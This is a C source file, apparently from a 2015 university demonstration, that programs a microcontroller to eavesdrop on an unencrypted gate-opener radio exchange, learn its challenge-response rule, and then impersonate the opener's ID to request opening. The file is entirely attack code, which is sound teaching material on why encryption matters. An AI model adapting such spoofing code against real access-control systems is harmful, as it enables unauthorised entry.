/*
Joseph Finnegan
Maynooth University
Summer 2015

For use with an ATmega128RFA1 microcontroller
Works with an opener and a gate, to show that an attacker can imitate an opener easily if messages are not encrypted.

Attacker listens in to an open request done nearby.
From the exchange it learns the "Open" keyword, the number sent by the gate, and the number sent back by the opener in response.
Using these two numbers the attacker can figure out what the protocol is (e.g. add 1 to the number)

Once this is done the attacker can imitate the opener, even using its ID.
On button press the attacker functions exactly like an opener.
*/

//
// AVR C library
//
#include <avr/io.h>

//
// Standard C include files
//
#include <stdbool.h>
#include <stdio.h>
#include <stdio.h>
#include "string.h"

//
// Header files for the various required libraries
//
#include "app.h"
#include "simple_os.h"
#include "button.h"
#include "leds.h"
#include "radio.h"
#include "serial.h"
#include "hw_timer.h"

unsigned short opener;
unsigned short gate;
//
// Constants
//
#define ACK "ACKACKacACKACKac"
#define NACK "NACKNACKNACKNACK"

typedef struct Packet {
	uint16_t dst;
	uint16_t src;
	char dt[16];
} Packet;


//
// Global Variables
//
static timer timer1;

// Buffer for transmitting radio packets
unsigned char tx_buffer[RADIO_MAX_LEN];
bool tx_buffer_inuse=false; // Check false and set to true before sending a message. Set to false in tx_done

int dest = 0x02;
bool canSend = false;
Packet newPkt;

//State-based system - TODO: neaten this up
bool firstPacket = true;
bool secondPacket = false;
bool thirdPacket = false;
bool fourthPacket = false;

bool canOpen = false;
bool awaitingResponse = false;

long difference = 0;
char openKeyword[17];
char challenge[17];
char response[17];

//
// App init function
//
void application_start()
{
	leds_init();
	button_init();
	
	radio_init(NODE_ID, true); //true indicates receives radio message for ALL nodes
	radio_set_power(1);
	radio_start();
	
	serial_init(9600);
	
	timer_init(&timer1, TIMER_MILLISECONDS, 1000, 100);
	timer_start(&timer1);
}
//
// Timer tick handler
//
void application_timer_tick(timer *t)
{
	if(canSend){
		if(tx_buffer_inuse == false)
		{
			tx_buffer_inuse = true;
			canSend = false;
			
			memcpy(&tx_buffer, &newPkt, sizeof(Packet));
			
			radio_send(tx_buffer, sizeof(Packet), newPkt.dst);
		}
	}
	
}

//
// This function is called whenever a radio message is received
//
void application_radio_rx_msg(unsigned short dst, unsigned short src, int len, unsigned char *msgdata)
{
	char string[17];
	for(int i = 4; i<len; i++)
	{
		string[i-4] = msgdata[i];
	}
	string[16] = '\0';

	if(!canOpen){ //Learning process
		if(firstPacket){ //learn the "OPEN" keyword
			gate = dst;
			opener = src;
			
			sprintf(openKeyword, string);
			firstPacket = false;
			secondPacket = true;
		}
		else if(src == gate && secondPacket){ //learn the challenge sent by the gate
			sprintf(challenge, string);
			secondPacket = false;
			thirdPacket = true;
		}
		else if(src == opener && thirdPacket){ //learn what response the opener gave
			sprintf(response,string);
			thirdPacket = false;
			fourthPacket = true;
		}
		//going to assume that the attacker will know if the attack is successful or not (ack or nack). In reality user could input into device that the opening was successful or not.
		else if(fourthPacket && strcmp(string, ACK) == 0){
			//the opening was successful - there should be some recognisable difference between the challenge and response.
			//going to simplify and assume its an addition. Would be better to learn what the difference is.
			canOpen = true;
			difference = atol(response) - atol(challenge);
			
			leds_off(LED_RED);
			leds_on(LED_ORANGE);
			leds_off(LED_GREEN);
		}
		else if(fourthPacket && strcmp(string, NACK) == 0){
			//the opening wasn't successful, so the learned challenge and response we learned are useless.
			sprintf(challenge,"");
			sprintf(response, "");
			leds_off(LED_GREEN);
			leds_off(LED_ORANGE);
			leds_on(LED_RED);
			firstPacket = true;
			fourthPacket = false;
		}	
	}
	else //already learned how to open. Sent an open request, waiting for a response from the gate.
	{
		if(strcmp(string, NACK) == 0){
			//Damn.
			leds_off(LED_GREEN);
			leds_off(LED_ORANGE);
			leds_on(LED_RED);
		}
		else if(strcmp(string, ACK) == 0){
			//Yes, gate has opened!
			leds_off(LED_RED);
			leds_off(LED_ORANGE);
			leds_on(LED_GREEN);		
		}
		else{
			if(src == gate){
				if(awaitingResponse){
					long temp1 = atol(string);
					temp1 += difference;

					newPkt.dst = src;
					if(opener != 0){
						newPkt.src = opener;
					}
					else{
						newPkt.src = NODE_ID;
					}
					sprintf(newPkt.dt, "%lu", temp1);
					//canSend = true;
					
					leds_off(LED_RED);
					leds_on(LED_ORANGE);
					leds_off(LED_GREEN);
					awaitingResponse = false;
				}
				
			}
		}
	}
}

//
// This function is called whenever a radio message has been transmitted
//
void application_radio_tx_done()
{
	tx_buffer_inuse = false;
	
	//empty buffers after data has been sent
	for(int j=0; j<RADIO_MAX_LEN; j++)
	{
		tx_buffer[j] = 0x00;
	}
	newPkt.dst = 0x00;
	newPkt.src = 0x00;
	for(int i=0;i<sizeof(newPkt.dt);i++){
		newPkt.dt[i] = 0;
	}
}

void application_button_pressed()
{
	if(canOpen){
		newPkt.dst = gate;
		newPkt.src = opener; //pretend to be the opener we've picked up :)
		sprintf(newPkt.dt, openKeyword);
		canSend = true;
		
		leds_off(LED_RED);
		leds_on(LED_ORANGE);
		leds_on(LED_GREEN);
		
		awaitingResponse = true;
	}
}

void application_button_released()
{
	//not needed
}